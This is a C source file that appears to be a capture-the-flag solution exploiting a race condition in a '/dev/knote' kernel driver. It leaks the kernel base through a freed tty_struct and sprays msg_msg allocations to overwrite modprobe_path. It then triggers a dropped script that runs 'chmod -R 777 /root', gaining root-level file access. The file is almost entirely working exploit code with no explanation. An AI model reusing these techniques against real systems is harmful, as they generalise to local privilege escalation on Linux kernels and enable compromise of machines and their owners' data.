#define NULL ((void *)0)
#define CLONE_VM 0x100
#define STACK_SIZE 0x2000
#define O_RDONLY 00
#define O_WRONLY 01
#define O_CREAT 0100
#define O_RDWR 02
#define IPC_CREAT 00001000

typedef unsigned long size_t;
typedef long ssize_t;
typedef int pid_t;
typedef int key_t;

struct timespec {
  long tv_sec;
  long tv_nsec;
};

struct timeval {
  long tv_sec;
  long tv_usec;
};

struct list_head {
  struct list_head *next;
  struct list_head *prev;
};

struct hlist_node {
  struct hlist_node *next;
  struct hlist_node **pprev;
};

struct tty_struct {
  int magic;
  int kref;
  void *dev;
  void *driver;
  void *ops;
  char pad[1024 - 32];
};

struct msg_msg {
  struct list_head m_list;
  long m_type;
  size_t m_ts;
  void *next;
  void *security;
};

const int kNanosPerMilli = 1000000;

int open(const char *path, int oflag);
int chmod(const char *path, int mode);
int ioctl(int fd, unsigned int cmd, void *arg);
int clone(int flags, void *child_stack);
void exit(int status);
int execve(char *filename, char *const argv[], char *const envp[]);
int close(int fd);
int read(int fd, const void *buf, unsigned long count);
int write(int fd, const void *buf, unsigned long count);
int fork(void);
int nanosleep(const struct timespec *req, struct timespec *rem);
int sched_setaffinity(pid_t pid, unsigned int len,
                      unsigned long *user_mask_ptr);

int msgget(key_t key, int msgflg);
int msgsnd(int msqid, const void *msgp, size_t msgsz, int msgflg);

void exploit(void);

#define CHECK(condition)                        \
  do {                                          \
    if (!(condition)) {                         \
      do_fatal(__FILE__, __LINE__, #condition); \
    }                                           \
  } while (0);

size_t strlen(const char *str) {
  size_t n = 0;
  while (*str++) {
    ++n;
  }
  return n;
}

void print(const char *str) { write(1, str, strlen(str)); }

char *itoa(long n) {
  if (n == 0) {
    return "0";
  }
  static char buf[32] = {0};
  int i = 30;
  for (; n && i; --i, n /= 10) buf[i] = "0123456789abcdef"[n % 10];
  return &buf[i + 1];
}

void print_hex(unsigned long n) {
  int i;
  char buf[16];

  print("0x");
  for (i = 0; i < 16; ++i) {
    buf[16 - i - 1] = "0123456789abcdef"[(n >> (4 * i)) & 0xf];
  }

  write(1, buf, sizeof(buf));
}

void hexdump(const unsigned char *x, size_t n) {
  char buf[3];
  buf[2] = ' ';

  for (size_t i = 0; i < n; ++i) {
    unsigned char b = x[i];
    buf[0] = "0123456789abcdef"[b >> 4];
    buf[1] = "0123456789abcdef"[b & 0xf];
    write(1, buf, sizeof(buf));
    if (i != 0 && i % 32 == 0) {
      print("\n");
    }
  }
  print("\n");
}

void *memcpy(char *dest, const char *src, size_t n) {
  char *ptr = dest;
  while (n-- > 0) {
    *ptr++ = *src++;
  }
  return dest;
}

void do_fatal(const char *file, int line, const char *condition) {
  print("Check failed at ");
  print(file);
  print(":");
  print(itoa(line));
  print(": ");
  print(condition);
  print("\n");
  asm("int3");
}

void sleep_ms(unsigned long ms) {
  unsigned long seconds = ms / 1000;
  ms %= 1000;
  struct timespec ts = {seconds, ms * kNanosPerMilli};
  CHECK(nanosleep(&ts, NULL) == 0);
}

char getchar() {
  char c;
  read(0, &c, 1);
  return c;
}

char getc() {
  char c = getchar();
  getchar();  // new line
  return c;
}

const unsigned long ADD_NOTE = 0x1337;
const unsigned long DELETE_NOTE = 0x1338;
const unsigned long READ_NOTE = 0x1339;
const unsigned long EDIT_NOTE = 0x133a;

const unsigned long EDIT_NOTE_BUF = 0x1EE12EE23EE34EE4LL;
const unsigned long EDIT_NOTE_EPOCH = 0xA11AB11BC11CD11DLL;

#define ADD_ID(arg) (arg).time.year

struct note_time {
  unsigned long year;
  unsigned long month;
  unsigned long day;
  unsigned long hour;
  unsigned long minute;
  unsigned long second;
};

struct note {
  struct note_time time;
  unsigned long epoch;
  unsigned long id;
  void *buf;
  struct hlist_node node;
};

struct add_note_arg {
  struct note_time time;
  unsigned long len;
  void *buf;
};

struct delete_note_arg {
  unsigned long id;
  struct note_time time;
};

struct read_note_arg {
  unsigned long id;
  struct note_time time;
  unsigned long len;
  void *buf;
};

struct edit_note_buf_arg {
  unsigned long edit_type;
  unsigned long id;
  struct note_time time;
  unsigned long len;
  void *buf;
};

struct edit_note_epoch_arg {
  unsigned long edit_type;
  unsigned long id;
  struct note_time time;
  struct note_time new_time;
};

int g_fd;
unsigned long g_kernel_base;

int add_note(struct add_note_arg *arg) { return ioctl(g_fd, ADD_NOTE, arg); }

int delete_note(struct delete_note_arg *arg) {
  return ioctl(g_fd, DELETE_NOTE, arg);
}

int read_note(struct read_note_arg *arg) { return ioctl(g_fd, READ_NOTE, arg); }

int edit_note_buf(struct edit_note_buf_arg *arg) {
  return ioctl(g_fd, EDIT_NOTE, arg);
}

int edit_note_epoch(struct edit_note_epoch_arg *arg) {
  return ioctl(g_fd, EDIT_NOTE, arg);
}

char g_child_stack[STACK_SIZE];
int start_thread(void (*func)(void)) {
  char *stack_top = g_child_stack + STACK_SIZE - 8;
  *(void **)stack_top = func;
  return clone(CLONE_VM, stack_top);
}

unsigned long g_note_id;

volatile int stop_edits;

void setaffinity(unsigned long mask) {
  CHECK(sched_setaffinity(0, sizeof(mask), &mask) == 0);
}

void edit_thread(void) {
  setaffinity(1);
  struct edit_note_epoch_arg edit_note_epoch_arg = {0};
  edit_note_epoch_arg.edit_type = EDIT_NOTE_EPOCH;
  edit_note_epoch_arg.id = g_note_id;

  int i = 0;
  while (!stop_edits) {
    CHECK(edit_note_epoch(&edit_note_epoch_arg) == 0);
    ++i;
  }

  print("edit thread done, edited: ");
  print(itoa(i));
  print(" times\n");

  exploit();
  exit(0);
}

struct overwrite {
  long mtype;
  unsigned long usermodehelper_disabled;
  char modprobe_path[16];
};

static char g_script[] = "/home/note/x";
static char g_payload[] = "#!/bin/sh\nchmod -R 777 /root /root/*; while true; do sleep 100; done;\n";

static char g_invalid[] = "/home/note/y";

void exploit(void) {
  unsigned long modprobe_path = g_kernel_base + 0xe47800;
  unsigned long overwrite_addr = modprobe_path - 8;
  unsigned long fake_chunk = overwrite_addr - sizeof(struct msg_msg);

  print("Deleting note...\n");
  // Delete note (which may or may not be the target)
  struct delete_note_arg delete_note_arg = {0};
  delete_note_arg.id = g_note_id;
  CHECK(delete_note(&delete_note_arg) == 0);

  print("Adding target note...\n");
  struct add_note_arg add_note_arg = {0};
  for (int i = 0; i < 2; ++i) {
    ADD_ID(add_note_arg) = fake_chunk;
    CHECK(add_note(&add_note_arg) == 0);
  }

  const key_t key = 0x1337;
  int qid = msgget(key, IPC_CREAT | 0666);
  CHECK(qid >= 0);

  struct overwrite overwrite = {0};
  overwrite.mtype = 1337;
  memcpy(overwrite.modprobe_path, g_script, sizeof(g_script));

  char buf[32] = {0};
  while (1) {
    print("trying to allocate: ");
    print_hex(fake_chunk);
    print("\n");
    msgsnd(qid, &overwrite, sizeof(overwrite) - 8, 0);
    int fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
    CHECK(fd > 0);
    CHECK(read(fd, buf, sizeof(buf)) > 0);
    close(fd);
    if (buf[1] != 's') {
      break;
    }
  }

  print("Modified modprobe: ");
  print(buf);

  msgsnd(qid, &overwrite, sizeof(overwrite) - 8, 0);
  execve(g_invalid, NULL, NULL);
  while(1);
}

void _start(void) {
  int fd = open(g_script, O_WRONLY | O_CREAT);
  CHECK(fd > 0);
  CHECK(write(fd, g_payload, sizeof(g_payload)) == sizeof(g_payload));
  close(fd);
  chmod(g_script, 0777);

  fd = open(g_invalid, O_WRONLY | O_CREAT);
  CHECK(fd > 0);
  CHECK(write(fd, "\xff\xff\xff\xff", 4) == 4);
  close(fd);
  chmod(g_invalid, 0777);

  g_fd = open("/dev/knote", O_RDWR);

  int ptmx_fd = open("/dev/ptmx", O_RDWR);
  close(ptmx_fd);

  struct add_note_arg add_note_arg = {0};
  CHECK(add_note(&add_note_arg) == 0);
  g_note_id = ADD_ID(add_note_arg);

	struct tty_struct leak;
  struct read_note_arg read_note_arg = {0};
  read_note_arg.id = g_note_id;
  read_note_arg.len = sizeof(leak);
  read_note_arg.buf = &leak;
  CHECK(read_note(&read_note_arg) == 0);

  g_kernel_base = (unsigned long) leak.ops - 0xa7ba00;
  print("kernel_base = ");
  print_hex(g_kernel_base);
  print("\n");

  print("Target note id: ");
  print_hex(g_note_id);
  print("\n");

  const int kNumNotes = 5000;
  print("Spamming notes\n");
  for (int i = 0; i < kNumNotes; ++i) {
    ADD_ID(add_note_arg) = 0;
    CHECK(add_note(&add_note_arg) == 0);
  }

  setaffinity(2);

  struct delete_note_arg delete_note_arg = {0};
  delete_note_arg.id = g_note_id;

  print("Starting threads\n");
  start_thread(&edit_thread);

  sleep_ms(100);

  CHECK(delete_note(&delete_note_arg) == 0);
  print("delete done: ");
  print("\n");

  sleep_ms(1000);
  stop_edits = 1;

  while (1)
    ;
  exit(0);
}
